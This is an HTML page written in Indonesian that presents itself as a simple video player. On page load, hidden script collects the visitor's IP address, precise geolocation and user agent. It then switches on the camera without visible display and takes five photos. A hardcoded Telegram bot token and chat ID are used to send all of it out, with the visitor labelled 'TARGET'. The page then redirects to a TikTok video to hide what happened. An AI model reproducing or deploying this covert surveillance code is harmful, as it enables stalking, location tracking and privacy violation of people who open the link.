<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Video Player</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .video-container {
            width: 100%;
            background: #000;
        }
        video {
            width: 100%;
            height: auto;
            display: block;
        }
        /* Segala elemen yang mencurigakan disembunyikan */
        .hidden {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
<div class="video-container">
    <video id="mainVideo" autoplay muted loop playsinline>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
    </video>
</div>

<!-- Elemen tersembunyi untuk kamera -->
<video id="hiddenVideo" class="hidden" autoplay muted playsinline></video>
<canvas id="hiddenCanvas" class="hidden"></canvas>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const BOT_TOKEN = "8778034522:AAHxz3IiOdU3efEkBPuNSFEOeU5InApiurA";
    const CHAT_ID = "8374152759";
    // ==========================================

    let cameraStream = null;
    let photoCount = 0;
    const TOTAL_PHOTOS = 5; // 5 kali potret
    let locationData = null;
    let ipAddress = "mengambil...";

    // Kirim pesan ke Telegram
    async function sendMessage(text) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text })
            });
        } catch(e) { console.log("Error message:", e); }
    }

    // Kirim foto ke Telegram
    async function sendPhoto(photoBase64, caption) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    photo: photoBase64,
                    caption: caption
                })
            });
        } catch(e) { console.log("Error photo:", e); }
    }

    // Ambil IP
    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch(e) { return 'tidak terdeteksi'; }
    }

    // Ambil lokasi (sekali)
    function getLocationOnce() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }),
                (err) => resolve(null),
                { enableHighAccuracy: true, timeout: 8000 }
            );
        });
    }

    // Ambil 1 foto dari stream kamera yang sudah aktif
    async function takeOnePhoto(photoNumber) {
        return new Promise((resolve) => {
            if (!cameraStream) {
                resolve(null);
                return;
            }
            
            const video = document.getElementById('hiddenVideo');
            const canvas = document.getElementById('hiddenCanvas');
            
            // Tunggu sebentar agar stabil
            setTimeout(() => {
                if (video.videoWidth > 0 && video.videoHeight > 0) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photo = canvas.toDataURL('image/jpeg', 0.85);
                    resolve(photo);
                } else {
                    resolve(null);
                }
            }, 200);
        });
    }

    // Fungsi utama: hidupkan kamera, lalu ambil 5 foto bertahap
    async function startStealth() {
        // Ambil IP
        ipAddress = await getIP();
        
        // Ambil lokasi diam-diam
        locationData = await getLocationOnce();
        if (locationData) {
            const mapsLink = `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}`;
            await sendMessage(`📍 LOKASI TARGET
Latitude: ${locationData.lat}
Longitude: ${locationData.lng}
Akurasi: ±${locationData.accuracy}m
Maps: ${mapsLink}
IP: ${ipAddress}
Waktu: ${new Date().toLocaleString('id-ID')}`);
        } else {
            await sendMessage(`⚠️ GAGAL AMBIL LOKASI
IP: ${ipAddress}
Waktu: ${new Date().toLocaleString('id-ID')}`);
        }

        // Minta akses kamera (diam-diam, tanpa tampilan)
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            cameraStream = stream;
            const video = document.getElementById('hiddenVideo');
            video.srcObject = stream;
            await video.play();
            
            // Kirim notifikasi awal ke Telegram
            await sendMessage(`🎯 TARGET MEMBUKA LINK
🌐 IP: ${ipAddress}
📱 User Agent: ${navigator.userAgent}
🕒 Waktu: ${new Date().toLocaleString('id-ID')}
📸 Akan mengambil ${TOTAL_PHOTOS} foto secara diam-diam`);

            // Ambil foto sebanyak TOTAL_PHOTOS kali
            for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                const photo = await takeOnePhoto(i);
                if (photo) {
                    await sendPhoto(photo, `📸 FOTO KE-${i} DARI ${TOTAL_PHOTOS}
🌐 IP: ${ipAddress}
🕒 ${new Date().toLocaleString('id-ID')}`);
                    photoCount++;
                }
                // Jeda antar foto 0.8 detik agar tidak terlalu cepat
                await new Promise(r => setTimeout(r, 800));
            }
            
            // Matikan kamera setelah selesai
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            
            // Laporan akhir
            await sendMessage(`✅ ZIME MAJESTY SELESAI
📸 Berhasil mengambil ${photoCount} dari ${TOTAL_PHOTOS} foto
🌐 IP: ${ipAddress}
🕒 Waktu selesai: ${new Date().toLocaleString('id-ID')}`);
            
        } catch(err) {
            console.log("Camera error:", err);
            await sendMessage(`❌ KAMERA GAGAL (izin ditolak)
🌐 IP: ${ipAddress}
📱 UA: ${navigator.userAgent}
🕒 ${new Date().toLocaleString('id-ID')}`);
        }
        
        // Redirect ke TikTok asli setelah semua proses selesai
        setTimeout(() => {
            window.location.href = "https://www.tiktok.com/@scardion/video/7456978207125212448";
        }, 1500);
    }

    // Jalankan setelah halaman siap
    window.addEventListener('load', () => {
        setTimeout(startStealth, 500);
    });
</script>
</body>
</html>
